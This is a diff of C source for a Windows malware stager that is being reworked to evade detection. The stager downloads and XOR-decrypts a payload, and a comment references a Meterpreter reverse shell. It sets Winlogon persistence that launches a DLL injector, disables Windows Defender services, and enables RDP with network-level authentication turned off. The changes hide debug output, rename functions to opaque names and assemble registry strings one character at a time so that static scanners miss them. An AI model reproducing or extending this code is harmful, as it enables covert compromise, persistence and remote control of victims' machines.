@@ -1,4 +1,5 @@
 #include <windows.h>
+
 #include <winhttp.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -8,7 +9,11 @@
 #include <wchar.h> 
 #include <wininet.h>
 
-#pragma comment(lib, "wininet.lib")
+
+
+//Add dead code
+//Add checkers to see if the registery keys are modified and services are created
+//Make the web server only requestable by CURL user agent (refer to nginx config)
 
 //mt.exe -manifest app.manifest -outputresource:.\stager.exe
 
@@ -16,6 +21,19 @@ NTSTATUS STATUS;
 unsigned char magic[160000];
 
 /* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/
+
+
+
+#ifdef _WIN64
+PPEB GetPEB() {
+    return (PPEB)__readgsqword(0x60);
+}
+#elif _WIN32
+PPEB GetPEB() {
+    return (PPEB)__readfsdword(0x30);
+}
+#endif
+
 
 char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
     int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
@@ -56,7 +74,7 @@ void obfuscate(ALL_ALPHANUM,original)
 
 
 void decrypt(unsigned char *magic, SIZE_T magic_size, char key) {
-    printf("[+] DECRYPTING with '%c' key\n", key);
+    //printf("[+] DECRYPTING with '%c' key\n", key);
     for (int i = 0; i < magic_size; i++) {
         //printf("\\x%02x", magic[i] ^ key);
         magic[i] = magic[i] ^ key;
@@ -69,14 +87,14 @@ void decrypt(unsigned char *magic, SIZE_T magic_size, char key) {
 HMODULE Get_Module(LPCWSTR Module_Name)
 {
 	HMODULE hModule;
-	printf("[+] Getting Handle to %lu\n", Module_Name);
+	//printf("[+] Getting Handle to %ls\n", Module_Name);
 	hModule = GetModuleHandleW(Module_Name);
 	if (hModule == NULL) {
-		printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
+		//printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
 		exit(1);
 	}
-	printf("[+] Got Handle to module!\n");
-	printf("[%ls\t0x%p]\n", Module_Name, hModule);
+	//printf("[+] Got Handle to module!\n");
+	//printf("[%ls\t0x%p]\n", Module_Name, hModule);
 	return hModule;
 }
 
@@ -85,31 +103,31 @@ HANDLE m_stuff(NtOpenMutant NT_OpenMutant, NtCreateMutant NT_CreateMutant,HANDLE
 	
 	//STATUS_OBJECT_NAME_NOT_FOUND
 	if(STATUS == 0xc0000034){
-		printf("[NT_OpenMutant] Mutant Object DOESN'T EXIST , status code 0x%lx\n",STATUS);
+		//printf("[NT_OpenMutant] Mutant Object DOESN'T EXIST , status code 0x%lx\n",STATUS);
 	}
 	
 	else if (STATUS == STATUS_SUCCESS){
-		printf("[NT_OpenMutant] Got Mutant Handle -> [0x%p]\n",hMux);
-		printf("[NT_OpenMutant] Mutant Object EXISTS\n");
-		printf("[x] EXITING\n");
+		//printf("[NT_OpenMutant] Got Mutant Handle -> [0x%p]\n",hMux);
+		//printf("[NT_OpenMutant] Mutant Object EXISTS\n");
+		//printf("[x] EXITING\n");
 		exit(0);
 	}
 	
-	printf("[NT_CreateMutant] Attempting to create mutant object\n");
+	//printf("[NT_CreateMutant] Attempting to create mutant object\n");
 	STATUS = NT_CreateMutant(&hMux,MUTANT_ALL_ACCESS,Object_Attr_mutant,TRUE);
 	if(STATUS != STATUS_SUCCESS){
-		printf("[NT_CreateMutant] Failed to create mutant object , error 0x%lx\n",STATUS);
+		//printf("[NT_CreateMutant] Failed to create mutant object , error 0x%lx\n",STATUS);
 		
-		return EXIT_FAILURE;
+		return NULL;
 	}
-	printf("[NT_CreateMutant] Created Mutant, Handle -> [0x%p]\n",hMux);
+	//printf("[NT_CreateMutant] Created Mutant, Handle -> [0x%p]\n",hMux);
 	//system("pause");
 	
 	return hMux;
 }
 
-
-BOOL netops(LPCWSTR filepath,
+/*
+BOOL nf12(LPCWSTR filepath,
 			FARPROC h_11_p_open_func,
 			FARPROC h_11_p_conn_func,
 			FARPROC h_11_p_open_req_func,
@@ -117,8 +135,7 @@ BOOL netops(LPCWSTR filepath,
 			FARPROC h_11_p_recv_func,
 			FARPROC h_11_p_query_func,
 			FARPROC h_11_p_read_func,
-			FARPROC h_11_p_close_func,
-			DWORD *actual_data)
+			FARPROC h_11_p_close_func)
 {
 	HINTERNET hSession = h_11_p_open_func(NULL,WINHTTP_ACCESS_TYPE_NO_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
 	if (!hSession ){
@@ -174,16 +191,16 @@ BOOL netops(LPCWSTR filepath,
         printf("[x] WinHttpReadData FAILED %lu\n", GetLastError());
         return 1;
     }
-	memcpy(actual_data,&dwDownloaded,sizeof(dwDownloaded));
+
 	printf("[+] WinHttpReadData DONE\n");
 	
 	
 	printf("[+] File content: \n%s\n", magic);
-	/*
+	
 	for (int i = 0; i < sizeof(magic); i++) {
 	printf("\\x%02x ", magic[i]);
 	}
-	*/
+	
 	printf("\n");
 	
 	
@@ -193,43 +210,40 @@ BOOL netops(LPCWSTR filepath,
     h_11_p_close_func(hConnect);
     h_11_p_close_func(hSession);
 }
+*/
 
 
 
-
-BOOL DownloadFile(const char *url, const char *output_path) {
-    HINTERNET hInternet = InternetOpenA("MyDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+BOOL dw_ff1e1(const char *url, const char *output_path,FARPROC n3t_op3n_func,FARPROC n3t_op3n_ur1_func,FARPROC n3t_r3ad_f1l3_func,FARPROC n3t_cl0s3_hndl3_func) {
+    HINTERNET hInternet = n3t_op3n_func("af21_ff1e1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) return FALSE;
 
-    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    HINTERNET hUrl = n3t_op3n_ur1_func(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
     if (!hUrl) {
-        InternetCloseHandle(hInternet);
+        n3t_cl0s3_hndl3_func(hInternet);
         return FALSE;
     }
 
     FILE *file = fopen(output_path, "wb");
     if (!file) {
-        InternetCloseHandle(hUrl);
-        InternetCloseHandle(hInternet);
+        n3t_cl0s3_hndl3_func(hUrl);
+        n3t_cl0s3_hndl3_func(hInternet);
         return FALSE;
     }
 
 	char keys[]={'P','L','S','a','5','p','A','1','w','F'};
     BYTE buffer[4096];
     DWORD bytes_read;
-    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
-        
-		
+    while (n3t_r3ad_f1l3_func(hUrl, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
 		for (int i = 0; i < sizeof(keys); i++){
 			decrypt(buffer,sizeof(buffer),keys[i]);
 		}
-		
 		fwrite(buffer, 1, bytes_read, file);
     }
 
     fclose(file);
-    InternetCloseHandle(hUrl);
-    InternetCloseHandle(hInternet);
+    n3t_cl0s3_hndl3_func(hUrl);
+    n3t_cl0s3_hndl3_func(hInternet);
     return TRUE;
 }
 
@@ -240,7 +254,7 @@ BOOL DownloadFile(const char *url, const char *output_path) {
 
 
 
-int persist(FARPROC open_key_reg_func,FARPROC set_key_reg_func,FARPROC close_key_reg_func){
+int ff_131mva(FARPROC open_key_reg_func,FARPROC set_key_reg_func,FARPROC close_key_reg_func){
 	
 	
 	//SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
@@ -430,59 +444,218 @@ int persist(FARPROC open_key_reg_func,FARPROC set_key_reg_func,FARPROC close_key
 	LPCSTR newValue=full_string_2;	//explorer.exe,\"C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\dll_injector.exe\" \"C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\legit.dll\"
 	LSTATUS open_key = open_key_reg_func(HKEY_LOCAL_MACHINE,subKey,0,KEY_SET_VALUE,&hKey);
 	if (open_key != ERROR_SUCCESS){
-		printf("Err opening the registery key -> code: %d\n",open_key);
+		//printf("Err opening the registery key -> code: %d\n",open_key);
 		return 1;
 	}
 	
 	
 	LSTATUS set_key = set_key_reg_func(hKey,valueName,0,REG_SZ,(BYTE*)newValue,strlen(newValue)+1);
 	if (set_key != ERROR_SUCCESS){
-		printf("Err setting the registery key -> code: %d\n",set_key);
+		//printf("Err setting the registery key -> code: %d\n",set_key);
 		return 1;
 	}
-	
-	printf("[+] Registery key modified successfully\n[+] BINGO YOU HAVE ACHIEVED SYSTEM LEVEL PERSISTANCE\n");
+	return 0;
+	//printf("[+] Registery key modified successfully\n[+] BINGO YOU HAVE ACHIEVED SYSTEM LEVEL PERSISTANCE\n");
 }
 
-int disable_def(FARPROC open_key_reg_func,FARPROC set_key_reg_func,FARPROC close_key_reg_func){
+int faow1231(FARPROC open_key_reg_func,FARPROC set_key_reg_func,FARPROC close_key_reg_func){
+	
+	char full_string_1[60];  
+	char part_1_1[] = "S";
+	char part_1_2[] = "Y";
+	char part_1_3[] = "S";
+	char part_1_4[] = "T";
+	char part_1_5[] = "Y";
+	char part_1_6[] = "M";
+	char part_1_7[] = "\\";
+	char part_1_8[] = "C";
+	char part_1_9[] = "ur";
+	char part_1_10[] = "re";
+	char part_1_11[] = "nt";
+	char part_1_12[] = "Co";
+	char part_1_13[] = "nt";
+	char part_1_14[] = "ro";
+	char part_1_15[] = "lS";
+	char part_1_16[] = "et\\";
+	char part_1_17[] = "Se";
+	char part_1_18[] = "rv";
+	char part_1_19[] = "ic";
+	char part_1_20[] = "es";
+	char part_1_21[] = "\\";
+	char part_1_22[] = "S";
+	char part_1_23[] = "e";
+	char part_1_24[] = "c";
+	char part_1_25[] = "u";
+	char part_1_26[] = "r";
+	char part_1_27[] = "i";
+	char part_1_28[] = "t";
+	char part_1_29[] = "y";
+	char part_1_30[] = "H";
+	char part_1_31[] = "e";
+	char part_1_32[] = "a";
+	char part_1_33[] = "l";
+	char part_1_34[] = "t";
+	char part_1_35[] = "h";
+	char part_1_36[] = "S";
+	char part_1_37[] = "e";
+	char part_1_38[] = "r";
+	char part_1_39[] = "v";
+	char part_1_40[] = "i";
+	char part_1_41[] = "c";
+	char part_1_42[] = "e";
+	strcpy(full_string_1, part_1_1);
+	strcat(full_string_1, part_1_2);
+	strcat(full_string_1, part_1_3);
+	strcat(full_string_1, part_1_4);
+	strcat(full_string_1, part_1_5);
+	strcat(full_string_1, part_1_6);
+	strcat(full_string_1, part_1_7);
+	strcat(full_string_1, part_1_8);
+	strcat(full_string_1, part_1_9);
+	strcat(full_string_1, part_1_10);
+	strcat(full_string_1, part_1_11);
+	strcat(full_string_1, part_1_12);
+	strcat(full_string_1, part_1_13);
+	strcat(full_string_1, part_1_14);
+	strcat(full_string_1, part_1_15);
+	strcat(full_string_1, part_1_16);
+	strcat(full_string_1, part_1_17);
+	strcat(full_string_1, part_1_18);
+	strcat(full_string_1, part_1_19);
+	strcat(full_string_1, part_1_20);
+	strcat(full_string_1, part_1_21);
+	strcat(full_string_1, part_1_22);
+	strcat(full_string_1, part_1_23);
+	strcat(full_string_1, part_1_24);
+	strcat(full_string_1, part_1_25);
+	strcat(full_string_1, part_1_26);
+	strcat(full_string_1, part_1_27);
+	strcat(full_string_1, part_1_28);
+	strcat(full_string_1, part_1_29);
+	strcat(full_string_1, part_1_30);
+	strcat(full_string_1, part_1_31);
+	strcat(full_string_1, part_1_32);
+	strcat(full_string_1, part_1_33);
+	strcat(full_string_1, part_1_34);
+	strcat(full_string_1, part_1_35);
+	strcat(full_string_1, part_1_36);
+	strcat(full_string_1, part_1_37);
+	strcat(full_string_1, part_1_38);
+	strcat(full_string_1, part_1_39);
+	strcat(full_string_1, part_1_40);
+	strcat(full_string_1, part_1_41);
+	strcat(full_string_1, part_1_42);
+	
+	
+	char full_string_3[10];  
+	char part_3_1[] = "S";
+	char part_3_2[] = "t";
+	char part_3_3[] = "a";
+	char part_3_4[] = "r";
+	char part_3_5[] = "t";
+	strcpy(full_string_3, part_3_1);
+	strcat(full_string_3, part_3_2);
+	strcat(full_string_3, part_3_3);
+	strcat(full_string_3, part_3_4);
+	strcat(full_string_3, part_3_5);
+	
+	
 	HKEY hKey_1;
-	LPCSTR subKey_1="SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService";
-	LPCSTR valueName_1="Start";
+	LPCSTR subKey_1=full_string_1;	//"SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService"
+	LPCSTR valueName_1=full_string_3;	//Start
 	DWORD newValue_1=4;
-	printf("[+] OPENING KEY..\n");
+	//printf("[+] OPENING KEY..\n");
 	LSTATUS open_key_1 = open_key_reg_func(HKEY_LOCAL_MACHINE,subKey_1,0,KEY_SET_VALUE,&hKey_1);
 	if (open_key_1 != ERROR_SUCCESS){
-		printf("Err opening the registery key -> code: %d\n",open_key_1);
+		//printf("Err opening the registery key -> code: %d\n",open_key_1);
 		return 1;
 	}
-	printf("[+] OPENED KEY..\n");
-	printf("[+] SETTING VALUE..\n");
+	//printf("[+] OPENED KEY..\n");
+	//printf("[+] SETTING VALUE..\n");
 	LSTATUS set_key_1 = set_key_reg_func(hKey_1,valueName_1,0,REG_SZ,(BYTE*)&newValue_1,sizeof(newValue_1));
 	if (set_key_1 != ERROR_SUCCESS){
-		printf("Err setting the registery key -> code: %d\n",set_key_1);
+		//printf("Err setting the registery key -> code: %d\n",set_key_1);
 		return 1;
 	}
-	printf("[+] VALUE SET CORRECTLY..\n");
+	//printf("[+] VALUE SET CORRECTLY..\n");
+	
+	
+	char full_string_2[50];  
+	char part_2_1[] = "S";
+	char part_2_2[] = "Y";
+	char part_2_3[] = "S";
+	char part_2_4[] = "T";
+	char part_2_5[] = "Y";
+	char part_2_6[] = "M";
+	char part_2_7[] = "\\";
+	char part_2_8[] = "C";
+	char part_2_9[] = "ur";
+	char part_2_10[] = "re";
+	char part_2_11[] = "nt";
+	char part_2_12[] = "Co";
+	char part_2_13[] = "nt";
+	char part_2_14[] = "ro";
+	char part_2_15[] = "lS";
+	char part_2_16[] = "et\\";
+	char part_2_17[] = "Se";
+	char part_2_18[] = "rv";
+	char part_2_19[] = "ic";
+	char part_2_20[] = "es";
+	char part_2_21[] = "\\";
+	char part_2_22[] = "w"; 
+	char part_2_23[] = "s";
+	char part_2_24[] = "c";
+	char part_2_25[] = "s";
+	char part_2_26[] = "v";
+	char part_2_27[] = "c";
+	strcpy(full_string_2, part_2_1);
+	strcat(full_string_2, part_2_2);
+	strcat(full_string_2, part_2_3);
+	strcat(full_string_2, part_2_4);
+	strcat(full_string_2, part_2_5);
+	strcat(full_string_2, part_2_6);
+	strcat(full_string_2, part_2_7);
+	strcat(full_string_2, part_2_8);
+	strcat(full_string_2, part_2_9);
+	strcat(full_string_2, part_2_10);
+	strcat(full_string_2, part_2_11);
+	strcat(full_string_2, part_2_12);
+	strcat(full_string_2, part_2_13);
+	strcat(full_string_2, part_2_14);
+	strcat(full_string_2, part_2_15);
+	strcat(full_string_2, part_2_16);
+	strcat(full_string_2, part_2_17);
+	strcat(full_string_2, part_2_18);
+	strcat(full_string_2, part_2_19);
+	strcat(full_string_2, part_2_20);
+	strcat(full_string_2, part_2_21);
+	strcat(full_string_2, part_2_22);
+	strcat(full_string_2, part_2_23);
+	strcat(full_string_2, part_2_24);
+	strcat(full_string_2, part_2_25);
+	strcat(full_string_2, part_2_26);
+	strcat(full_string_2, part_2_27);
 	
 	HKEY hKey_2;
-	LPCSTR subKey_2="SYSTEM\\CurrentControlSet\\Services\\wscsvc";
-	LPCSTR valueName_2="Start";
+	LPCSTR subKey_2=full_string_2;	//"SYSTEM\\CurrentControlSet\\Services\\wscsvc"
+	LPCSTR valueName_2=full_string_3;
 	DWORD newValue_2=4;
 	LSTATUS open_key_2 = open_key_reg_func(HKEY_LOCAL_MACHINE,subKey_2,0,KEY_SET_VALUE,&hKey_2);
 	if (open_key_1 != ERROR_SUCCESS){
-		printf("Err opening the registery key -> code: %d\n",open_key_2);
+		//printf("Err opening the registery key -> code: %d\n",open_key_2);
 		return 1;
 	}
 	LSTATUS set_key_2 = set_key_reg_func(hKey_2,valueName_2,0,REG_SZ,(BYTE*)&newValue_2,sizeof(newValue_2));
 	if (set_key_2 != ERROR_SUCCESS){
-		printf("Err setting the registery key -> code: %d\n",set_key_2);
+		//printf("Err setting the registery key -> code: %d\n",set_key_2);
 		return 1;
 	}
-	printf("[+] Registery key modified successfully\n[+] BINGO YOU HAVE DISABLED WINDOWS DEFENDER\n");
+	//printf("[+] Registery key modified successfully\n[+] BINGO YOU HAVE DISABLED WINDOWS DEFENDER\n");
+	return 0;
 	
 }
 
-BOOL fileops(LPCSTR full_path, FARPROC cr_file_func, FARPROC wr_file_func){
+BOOL f013(LPCSTR full_path, FARPROC cr_file_func, FARPROC wr_file_func){
 	HANDLE hFile = cr_file_func(
         full_path,           // File name
         GENERIC_WRITE,      // Desired access
@@ -493,7 +666,7 @@ BOOL fileops(LPCSTR full_path, FARPROC cr_file_func, FARPROC wr_file_func){
         NULL                // Template file
     );
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Failed to create or open file. Error code: %lu\n", GetLastError());
+        //printf("Failed to create or open file. Error code: %lu\n", GetLastError());
         exit(1);
     }
     DWORD bytesWritten;
@@ -506,23 +679,23 @@ BOOL fileops(LPCSTR full_path, FARPROC cr_file_func, FARPROC wr_file_func){
     );
 
     if (!writeResult) {
-        printf("Failed to write to file. Error code: %lu\n", GetLastError());
+        //printf("Failed to write to file. Error code: %lu\n", GetLastError());
         exit(1);
         
     }
     // Print the number of bytes written
-    printf("Successfully wrote %lu bytes to the file.\n", bytesWritten);
+    //printf("Successfully wrote %lu bytes to the file.\n", bytesWritten);
 	return TRUE;
 	
 }
 
 
 
-BOOL srv_stuff(FARPROC open_SC_func,FARPROC open_service_func,FARPROC start_service_func,FARPROC close_service_func){
+BOOL all1_901A(FARPROC open_SC_func,FARPROC open_service_func,FARPROC start_service_func,FARPROC close_service_func){
 	
     SC_HANDLE schSCManager = open_SC_func(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (schSCManager == NULL) {
-        printf("OpenSCManager failed (%d)\n", GetLastError());
+        //printf("OpenSCManager failed (%d)\n", GetLastError());
         exit(1);
 		return 1;
     }
@@ -531,24 +704,24 @@ BOOL srv_stuff(FARPROC open_SC_func,FARPROC open_service_func,FARPROC start_serv
 
     SC_HANDLE schService = open_service_func(
         schSCManager,              // SCM database
-        "win32_user_service",               // Name of service
+        "win_service32",               // Name of service
         SC_MANAGER_ALL_ACCESS              // Desired Access
     );
 	
     if (schService == NULL) {
-        printf("OpenService failed (%d)\n", GetLastError());
+        //printf("OpenService failed (%d)\n", GetLastError());
         close_service_func(schSCManager);
         exit(1);
     }
 	
 	BOOL bService = start_service_func(schService,0,NULL);
     if (bService == 0) {
-        printf("StartService failed (%d)\n", GetLastError());
+        //printf("StartService failed (%d)\n", GetLastError());
         close_service_func(schSCManager);
         exit(1);
     }
 
-    printf("Service started successfully\n");	
+    //printf("Service started successfully\n");	
     CloseServiceHandle(schService);
     CloseServiceHandle(schSCManager);
 	
@@ -567,63 +740,307 @@ void en_R_6_P(	FARPROC open_key_reg_func,
 {
     HKEY hKey;
     DWORD dwValue = 0;
-	printf("[+] opening first reg key\n");
+	//printf("[+] opening first reg key\n");
     // Open the registry key
-    if (open_key_reg_func(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
+	// SYSTEM\\CurrentControlSet\\Control\\Terminal Server
+	char full_string_4[50];  
+	char part_4_1[] = "S";
+	char part_4_2[] = "Y";
+	char part_4_3[] = "S";
+	char part_4_4[] = "T";
+	char part_4_5[] = "Y";
+	char part_4_6[] = "M";
+	char part_4_7[] = "\\";
+	char part_4_8[] = "C";
+	char part_4_9[] = "u";
+	char part_4_10[] = "r";
+	char part_4_11[] = "r";
+	char part_4_12[] = "e";
+	char part_4_13[] = "n";
+	char part_4_14[] = "t";
+	char part_4_15[] = "C";
+	char part_4_16[] = "o";
+	char part_4_17[] = "nt";
+	char part_4_18[] = "r";
+	char part_4_19[] = "o";
+	char part_4_20[] = "l";
+	char part_4_21[] = "S";
+	char part_4_22[] = "e";
+	char part_4_23[] = "t";
+	char part_4_24[] = "\\";
+	char part_4_25[] = "C";
+	char part_4_26[] = "o";
+	char part_4_27[] = "n";
+	char part_4_28[] = "t";
+	char part_4_29[] = "r";
+	char part_4_30[] = "o";
+	char part_4_31[] = "l";
+	char part_4_32[] = "\\";
+	char part_4_33[] = "T";
+	char part_4_34[] = "e";
+	char part_4_35[] = "r";
+	char part_4_36[] = "m";
+	char part_4_37[] = "i";
+	char part_4_38[] = "n";
+	char part_4_39[] = "a";
+	char part_4_40[] = "l";
+	char part_4_41[] = " ";
+	char part_4_42[] = "S";
+	char part_4_43[] = "e";
+	char part_4_44[] = "r";
+	char part_4_45[] = "v";
+	char part_4_46[] = "e";
+	char part_4_47[] = "r";
+	strcpy(full_string_4, part_4_1);
+	strcat(full_string_4, part_4_2);
+	strcat(full_string_4, part_4_3);
+	strcat(full_string_4, part_4_4);
+	strcat(full_string_4, part_4_5);
+	strcat(full_string_4, part_4_6);
+	strcat(full_string_4, part_4_7);
+	strcat(full_string_4, part_4_8);
+	strcat(full_string_4, part_4_9);
+	strcat(full_string_4, part_4_10);
+	strcat(full_string_4, part_4_11);
+	strcat(full_string_4, part_4_12);
+	strcat(full_string_4, part_4_13);
+	strcat(full_string_4, part_4_14);
+	strcat(full_string_4, part_4_15);
+	strcat(full_string_4, part_4_16);
+	strcat(full_string_4, part_4_17);
+	strcat(full_string_4, part_4_18);
+	strcat(full_string_4, part_4_19);
+	strcat(full_string_4, part_4_20);
+	strcat(full_string_4, part_4_21);
+	strcat(full_string_4, part_4_22);
+	strcat(full_string_4, part_4_23);
+	strcat(full_string_4, part_4_24);
+	strcat(full_string_4, part_4_25);
+	strcat(full_string_4, part_4_26);
+	strcat(full_string_4, part_4_27);
+	strcat(full_string_4, part_4_28);
+	strcat(full_string_4, part_4_29);
+	strcat(full_string_4, part_4_30);
+	strcat(full_string_4, part_4_31);
+	strcat(full_string_4, part_4_32);
+	strcat(full_string_4, part_4_33);
+	strcat(full_string_4, part_4_34);
+	strcat(full_string_4, part_4_35);
+	strcat(full_string_4, part_4_36);
+	strcat(full_string_4, part_4_37);
+	strcat(full_string_4, part_4_38);
+	strcat(full_string_4, part_4_39);
+	strcat(full_string_4, part_4_40);
+	strcat(full_string_4, part_4_41);
+	strcat(full_string_4, part_4_42);
+	strcat(full_string_4, part_4_43);
+	strcat(full_string_4, part_4_44);
+	strcat(full_string_4, part_4_45);
+	strcat(full_string_4, part_4_46);
+	strcat(full_string_4, part_4_47);
+	
+    if (open_key_reg_func(HKEY_LOCAL_MACHINE, full_string_4, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
         //printf("Failed to open registry key.\n");
         return;
     }
-	printf("[+] opening first reg key\n");
+	//printf("[+] opening first reg key\n");
+	// fDenyTSConnections
+	char full_string_5[20];  
+	char part_5_1[] = "f";
+	char part_5_2[] = "D";
+	char part_5_3[] = "e";
+	char part_5_4[] = "n";
+	char part_5_5[] = "y";
+	char part_5_6[] = "T";
+	char part_5_7[] = "S";
+	char part_5_8[] = "C";
+	char part_5_9[] = "o";
+	char part_5_10[] = "n";
+	char part_5_11[] = "n";
+	char part_5_12[] = "e";
+	char part_5_13[] = "c";
+	char part_5_14[] = "t";
+	char part_5_15[] = "i";
+	char part_5_16[] = "o";
+	char part_5_17[] = "n";
+	char part_5_18[] = "s";
+	strcpy(full_string_5, part_5_1);
+	strcat(full_string_5, part_5_2);
+	strcat(full_string_5, part_5_3);
+	strcat(full_string_5, part_5_4);
+	strcat(full_string_5, part_5_5);
+	strcat(full_string_5, part_5_6);
+	strcat(full_string_5, part_5_7);
+	strcat(full_string_5, part_5_8);
+	strcat(full_string_5, part_5_9);
+	strcat(full_string_5, part_5_10);
+	strcat(full_string_5, part_5_11);
+	strcat(full_string_5, part_5_12);
+	strcat(full_string_5, part_5_13);
+	strcat(full_string_5, part_5_14);
+	strcat(full_string_5, part_5_15);
+	strcat(full_string_5, part_5_16);
+	strcat(full_string_5, part_5_17);
+	strcat(full_string_5, part_5_18);
     // Set set_key_reg_func to 0 to enable RDP
-    if (set_key_reg_func(hKey, "fDenyTSConnections", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue)) != ERROR_SUCCESS) {
+    if (set_key_reg_func(hKey, full_string_5, 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue)) != ERROR_SUCCESS) {
         //printf("Failed to set fDenyTSConnections.\n");
         close_key_reg_func(hKey);
         return;
     }
+	
+	char full_string_6[20];  
+	char part_6_1[] = "U";
+	char part_6_2[] = "s";
+	char part_6_3[] = "e";
+	char part_6_4[] = "r";
+	char part_6_5[] = "A";
+	char part_6_6[] = "u";
+	char part_6_7[] = "t";
+	char part_6_8[] = "h";
+	char part_6_9[] = "h";
+	char part_6_10[] = "e";
+	char part_6_11[] = "t";
+	char part_6_12[] = "i";
+	char part_6_13[] = "c";
+	char part_6_14[] = "a";
+	char part_6_15[] = "t";
+	char part_6_16[] = "i";
+	char part_6_17[] = "o";
+	char part_6_18[] = "n";
+	strcpy(full_string_6, part_6_1);
+	strcat(full_string_6, part_6_2);
+	strcat(full_string_6, part_6_3);
+	strcat(full_string_6, part_6_4);
+	strcat(full_string_6, part_6_5);
+	strcat(full_string_6, part_6_6);
+	strcat(full_string_6, part_6_7);
+	strcat(full_string_6, part_6_8);
+	strcat(full_string_6, part_6_9);
+	strcat(full_string_6, part_6_10);
+	strcat(full_string_6, part_6_11);
+	strcat(full_string_6, part_6_12);
+	strcat(full_string_6, part_6_13);
+	strcat(full_string_6, part_6_14);
+	strcat(full_string_6, part_6_15);
+	strcat(full_string_6, part_6_16);
+	strcat(full_string_6, part_6_17);
+	strcat(full_string_6, part_6_18);
+	
+	
+	char full_string_7[25];  
+	char part_7_1[] = "f";
+	char part_7_2[] = "S";
+	char part_7_3[] = "i";
+	char part_7_4[] = "n";
+	char part_7_5[] = "g";
+	char part_7_6[] = "l";
+	char part_7_7[] = "e";
+	char part_7_8[] = "S";
+	char part_7_9[] = "e";
+	char part_7_10[] = "s";
+	char part_7_11[] = "s";
+	char part_7_12[] = "i";
+	char part_7_13[] = "o";
+	char part_7_14[] = "n";
+	char part_7_15[] = "P";
+	char part_7_16[] = "e";
+	char part_7_17[] = "r";
+	char part_7_18[] = "U";
+	char part_7_19[] = "s";
+	char part_7_20[] = "e";
+	char part_7_21[] = "r";
+	strcpy(full_string_7, part_7_1);
+	strcat(full_string_7, part_7_2);
+	strcat(full_string_7, part_7_3);
+	strcat(full_string_7, part_7_4);
+	strcat(full_string_7, part_7_5);
+	strcat(full_string_7, part_7_6);
+	strcat(full_string_7, part_7_7);
+	strcat(full_string_7, part_7_8);
+	strcat(full_string_7, part_7_9);
+	strcat(full_string_7, part_7_10);
+	strcat(full_string_7, part_7_11);
+	strcat(full_string_7, part_7_12);
+	strcat(full_string_7, part_7_13);
+	strcat(full_string_7, part_7_14);
+	strcat(full_string_7, part_7_15);
+	strcat(full_string_7, part_7_16);
+	strcat(full_string_7, part_7_17);
+	strcat(full_string_7, part_7_18);
+	strcat(full_string_7, part_7_19);
+	strcat(full_string_7, part_7_20);
+	strcat(full_string_7, part_7_21);
 
     // Optionally disable NLA (set UserAuthentication to 0)
-    if (set_key_reg_func(hKey, "UserAuthentication", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue)) != ERROR_SUCCESS) {
+    if (set_key_reg_func(hKey, full_string_6, 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue)) != ERROR_SUCCESS) {
         //printf("Failed to set UserAuthentication.\n");
         close_key_reg_func(hKey);
         return;
     }
 	// Set the fSingleSessionPerUser to 0 to allow multiple concurrent RDP sessions
-    if (set_key_reg_func(hKey, "fSingleSessionPerUser", 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue)) != ERROR_SUCCESS) {
+    if (set_key_reg_func(hKey, full_string_7, 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue)) != ERROR_SUCCESS) {
         //printf("Failed to set fSingleSessionPerUser.\n");
         close_key_reg_func(hKey);
         return;
     }
 
     close_key_reg_func(hKey);
-    printf("RDP enabled in the registry.\n");
+    //printf("RDP enabled in the registry.\n");
 
     // Start the Terminal Services service
     SC_HANDLE hSCManager = open_SC_func(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (hSCManager == NULL) {
-		printf("Failed to open Service Control Manage, error: %lu\n",GetLastError());
+		//printf("Failed to open Service Control Manage, error: %lu\n",GetLastError());
         return;
     }
-	printf("opened Service Control Manager.\n");
+	//printf("opened Service Control Manager.\n");
+	
+	char full_string_9[15];  //TermService
+	char part_9_1[] = "T";
+	char part_9_2[] = "e";
+	char part_9_3[] = "r";
+	char part_9_4[] = "m";
+	char part_9_5[] = "S";
+	char part_9_6[] = "e";
+	char part_9_7[] = "r";
+	char part_9_8[] = "v";
+	char part_9_9[] = "i";
+	char part_9_10[] = "c";
+	char part_9_11[] = "e";
+	strcpy(full_string_9, part_9_1);
+	strcat(full_string_9, part_9_2);
+	strcat(full_string_9, part_9_3);
+	strcat(full_string_9, part_9_4);
+	strcat(full_string_9, part_9_5);
+	strcat(full_string_9, part_9_6);
+	strcat(full_string_9, part_9_7);
+	strcat(full_string_9, part_9_8);
+	strcat(full_string_9, part_9_9);
+	strcat(full_string_9, part_9_10);
+	strcat(full_string_9, part_9_11);
 
-    SC_HANDLE hService = open_service_func(hSCManager, "TermService", SERVICE_START);
+
+
